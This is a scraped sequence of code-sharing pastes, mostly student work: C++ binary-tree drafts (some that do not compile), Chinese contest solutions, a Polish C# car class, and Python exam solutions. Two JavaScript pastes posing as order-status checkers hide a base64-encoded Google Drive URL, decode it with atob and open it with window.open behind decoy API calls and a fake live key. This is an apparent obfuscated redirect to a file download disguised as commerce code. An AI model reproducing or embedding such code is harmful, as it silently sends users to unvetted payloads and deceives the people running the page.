        Ri == Li - особ случ*/
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    node find_first(node  v) {
        res = v;
        while (v.l != nullptr) {
            res = v.l;
        }
        return res;
    }
    node find_next(node v) {
        return;
    }
    void output() {

        return;
    }
    void insert_after(node v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    T.output();
}

"
Hsi28Rb4,抽奖 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 04:09:48 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 1000 + 100;
int n, m, ans;
int x[3], idx[3], num[3];
int a[3][maxn];

int cal() {
    if (num[0] == num[1] - 1 && num[1] == num[2] - 1) {
        return 200;
    }
    if (num[0] == num[1] && num[1] == num[2]) {
        return 200;
    }
    sort(num, num + 3);
    if (num[0] == num[1] - 1 && num[1] == num[2] - 1) {
        return 100;
    }
    if (num[0] == num[1] || num[1] == num[2]) {
        return 100;
    }
    return 0;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    cin >> n;
    for (int i = 0; i < 3; ++i) {
        for (int j = 0; j < n; ++j) {
            cin >> a[i][j];
        }
    }
    cin >> m;
    for (int i = 0; i < m; ++i) {
        for (int j = 0; j < 3; ++j) {
            cin >> x[j];
            idx[j] = (idx[j] + x[j]) % n;
            num[j] = a[j][idx[j]];
        }
        ans += cal();
    }
    cout << ans << endl;

    return 0;
}
"
KCRsKwNj,Auto_klasa,cuniszkiewicz,C#,Saturday 12th of April 2025 04:08:10 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace OOP_1N122L_IS_SK_lato_2025
{
    public class Auto
    {
        //pola
        public string marka;
        public string model;
        private int predkoscMaksymalna;
        public double pojemnoscSilnika;


        //metody
        public void Opis()
        {
            Console.WriteLine($""Auto: {marka} {model}, "" +
                    $""prędkość maksymalna: {predkoscMaksymalna}km/h,"" +
                    $""pojemność skokowa silnika to {pojemnoscSilnika}ccm"");

        }


        public double PoliczCzasPrzejazdu(int kilometry)
        {
            double czas = 0;

            if (predkoscMaksymalna > 0)
                czas = (double)kilometry / predkoscMaksymalna;

            return czas;
        }

        //konstruktory

        public Auto()
        {
            marka = ""Fiat"";
            model = ""Punto"";
            predkoscMaksymalna = 180;
            pojemnoscSilnika = 1199;
        }

        public Auto(string _marka, string _model, int _predkoscMaksymalna = 180, double _pojemnoscSilnika = 1199)
        {
            marka = _marka;
            model = _model;
            predkoscMaksymalna = _predkoscMaksymalna;
            pojemnoscSilnika = _pojemnoscSilnika;
        }

        public Auto(Auto autoWzorcowe)
        {
            marka = autoWzorcowe.marka;
            model = autoWzorcowe.model;
            predkoscMaksymalna = autoWzorcowe.predkoscMaksymalna;
            pojemnoscSilnika = autoWzorcowe.pojemnoscSilnika;
        }

        //metody ustawiające

        public void UstawPredkoscMaksymalna(int _predkosc)
        {
            if (_predkosc >= 20)
                predkoscMaksymalna = _predkosc;
            else
                predkoscMaksymalna = 20;
        }

        public int WezPredkoscMaksymalna()
        { 
            return predkoscMaksymalna;
        }

        //Właściwości
        public int PredkoscMaksymalna
        {
            get { return predkoscMaksymalna; }
            set
            {
                if (value >= 20 && value < 400)
                    predkoscMaksymalna = value;
                else
                    predkoscMaksymalna = 20;
            }
        }

        private double temperaturaOleju;

        public double TemperaturaOlejuC
        {
            get { return temperaturaOleju; }
            set { 
                if (value > 0 && value < 140)
                    temperaturaOleju = value; 
                else
                    temperaturaOleju = 90;
            }
        }
        public double TemperaturaOlejuK
        {
            get { return temperaturaOleju + 273.15; }
            set
            {
                if (value > 273.15 && value < 413.15)
                    temperaturaOleju = value - 273.15;
                else
                    temperaturaOleju = 90;
            }
        }

    }

    internal class Program
    {
        static void Main(string[] args)
        {
            Auto auto = new Auto();
            Auto auto2 = new Auto();
            Auto auto3 = new Auto(""VW"",""Golf"",210,1998);
            Auto auto4 = new Auto(""Mazda"", ""6"");


            auto.marka = ""Ferrari"";
            auto.model = ""F40"";
            //auto.predkoscMaksymalna = 350;
            //auto.UstawPredkoscMaksymalna(300);
            auto.PredkoscMaksymalna = 350;
            auto.pojemnoscSilnika = 5999;

            Auto auto5 = new Auto(auto);
            
            
            auto.Opis();
            /*
            auto2.Opis();
            auto3.Opis();
            auto4.Opis();
            auto5.Opis();
            */
            /*
            Console.WriteLine($""Auto {auto.marka} {auto.model} "" +
                $""potrzebuje: {auto.PoliczCzasPrzejazdu(500)} godziny do przejachania 500km"");
            */

            Console.WriteLine($""Prędkość maksymalna auta {auto.model} to: {auto.PredkoscMaksymalna}km/h"");

            auto.TemperaturaOlejuC = 100;
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuC} C"");
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuK} K"");
            auto.TemperaturaOlejuK = 373.15;
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuC} C"");
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuK} K"");


            Console.ReadKey();


        }
    }
}
"
YzCRWpdW,tree4,Korotkodul,C++,Saturday 12th of April 2025 04:08:06 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    void output() {

        return;
    }
    void find_first(int*  v) {
        return;
    }
    void find_nex(int* v) {
        return;
    }
    void insert_after(int* v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    T.output();
}

"
JiASaW30,19 20 21 две кучи странные,nq1s788,Python,Saturday 12th of April 2025 04:07:13 AM CDT,"#19 20 21 https://inf-ege.sdamgia.ru/test?id=17982110
from functools import lru_cache


def moves(h):
    ret = []
    x, y = h
    if y < x:
        x, y = y, x
    for add in range(1, x + 1):
        ret.append((x + add, y))
    return ret


@lru_cache(None)
def game(h):
    if sum(h) > 39:
        return 'WIN'
    elif any(game(m) == 'WIN' for m in moves(h)):
        return 'P1'
    elif all(game(m) in ['P1'] for m in moves(h)):
        return 'V1'
    elif any(game(m) == 'V1' for m in moves(h)):
        return 'P2'
    elif all(game(m) in ['P1', 'P2'] for m in moves(h)):
        return 'V2'


def p19(h):
    return any(game(m) == 'P1' for m in moves(h))


a19 = 100000000
for fi in range(1, 39):
    for se in range(fi, 39):
        if fi + se > 39:
            continue
        if game((fi, se)) == 'P1':
            a19 = min(a19, fi+se)
print(a19)

#print([s for s in range(1, 72) if p19((14, s))]) #ваня выиграл первым ходом
print([s for s in range(1, 36) if game((4, s)) == 'P2']) #петя вторым ходом
print([s for s in range(1, 36) if game((4, s)) == 'V2'])
"
MW049tDw,tree,Korotkodul,C++,Saturday 12th of April 2025 04:02:49 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr = {1, 2, 3, 4, 5}; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        create_subtree(nullptr, 0, len - 1);
        return;
    }
    void output() {

        return;
    }
    void find_first(int*  v) {
        return;
    }
    void find_nex(int* v) {
        return;
    }
    void insert_after(int* v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    T.output();
}

"
yKHkqWmf,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 03:58:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62023/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BEyF6ADC,黑白棋 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 03:55:51 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 10 + 100;
int maskRow[maxn], maskCol[maxn];
int n = 6;
string str[maxn] = {
    ""10.0.."",
    ""...0.."",
    ""....00"",
    ""......"",
    ""..1..1"",
    "".0..1.""
};

bool judgeCol(int x, int y) {
    for (int i = 0; i < y; ++i) {
        if (maskCol[i] == maskCol[y]) {
            return false;
        }
    }
    return __builtin_popcount(maskCol[y]) == 3;
}

bool judgeRow(int x, int y) {
    for (int i = 0; i < x; ++i) {
        if (maskRow[i] == maskRow[x]) {
            return false;
        }
    }
    return __builtin_popcount(maskRow[x]) == 3;
}


bool dfs(int depth);

bool markAndDfs(int x, int y, int mark) {
    char ch = str[x][y];
    str[x][y] = (mark + '0');
    maskRow[x] |= (mark << y);
    maskCol[y] |= (mark << x);
    bool colFlag = (x < 2 ||
                    (__builtin_popcount((maskCol[y] >> (x - 2)) & 7) != 0 &&
                     __builtin_popcount((maskCol[y] >> (x - 2)) & 7) != 3));
    if (x == n - 1) {
        colFlag = colFlag && judgeCol(x, y);
    }
    bool rowFlag = (y < 2 || (
                        __builtin_popcount((maskRow[x] >> (y - 2)) & 7) != 0 &&
                        __builtin_popcount((maskRow[x] >> (y - 2)) & 7) != 3));
    if (y == n - 1) {
        rowFlag = rowFlag && judgeRow(x, y);
    }
    if (colFlag && rowFlag) {
        if (dfs(x * n + y + 1)) {
            return true;
        }
    }
    str[x][y] = ch;
    maskRow[x] &= ~(1 << y);
    maskCol[y] &= ~(1 << x);
    return false;
}

bool dfs(int depth) {
    int x = depth / n;
    int y = depth % n;
    if (depth == 36) {
        for (int i = 0; i < n; ++i) {
            cout << str[i] << endl;
        }
        cout << endl;
        return true;
    }
    if (str[x][y] == '.') {
        if (markAndDfs(x, y, 0)) {
            return true;
        }
        if (markAndDfs(x, y, 1)) {
            return true;
        }
        return false;
    }
    if (str[x][y] == '0') {
        return markAndDfs(x, y, 0);
    }
    return markAndDfs(x, y, 1);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    dfs(0);

    return 0;
}
"
BFNA7AJQ,tree2,Korotkodul,C++,Saturday 12th of April 2025 03:47:01 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

constint inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr = {1, 2, 3, 4, 5}; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        node root(par); 
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(Li, Li);
            root.l = left_root;
            return root;
        }
        left_root = create_subtree(0, (Ri + Li) / 2 - 1);
        right_root = create_subtree((Ri + Li) / 2 + 1, len - 1);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        int len = a.size();
        create_subtree(nullprt, 0, len);
        return;
    }
    void output() {
        return;
    }
    void find_first(int*  v) {
        return;
    }
    void find_nex(int* v) {
        return;
    }
    void insert_after(int* v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T()
}

"
FxUdTVHx,24 набрать макс сумму,nq1s788,Python,Saturday 12th of April 2025 03:45:41 AM CDT,"#https://postimg.cc/Xpdnmg0H
data = open('24.txt').readline()
mx = -10000000000
cur_sm = 0
cur_ch = ''
f = False
for i in range(len(data)):
    if data[i] in '123456789':
        if f:
            cur_ch += data[i]
    if data[i] == '+':
        if f and len(cur_ch) != 0:
            cur_sm += int(cur_ch)
            cur_ch = ''
        else:
            mx = max(mx, cur_sm)
            cur_sm = 0
            f = False
    if data[i] in 'ABCD-*':
        if len(cur_ch) != 0:
            cur_sm += int(cur_ch)
            cur_ch = ''
        mx = max(mx, cur_sm)
        cur_sm = 0
        f = False
        if data[i] == 'D':
            f = True
if len(cur_ch) != 0:
    cur_sm += int(cur_ch)
    cur_ch = ''
mx = max(mx, cur_sm)
print(mx)"
27NFyp6c,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 03:43:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81284/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
veGiKzSA,tree1,Korotkodul,C++,Saturday 12th of April 2025 03:32:56 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

constint inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int vall
    node(par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> a = {1, 2, 3, 4, 5};
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        node root(par); 
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(Li, Li);
            root.l = left_root;
            return root;
        }
        root.self = &arr[len / 2];
        left_root = create_subtree(0, len / 2 - 1);
        right_root = create_subtree(len / 2 + 1, len - 1);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> arr) {
        a = arr;
        int len = a.size();
        create_subtree(0, len);
        return;
    }
    void output() {
        return;
    }
    void find_first(int*  v) {
        return;
    }
    void find_nex(int* v) {
        return;
    }
    void insert_after(int* v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T()
}

"
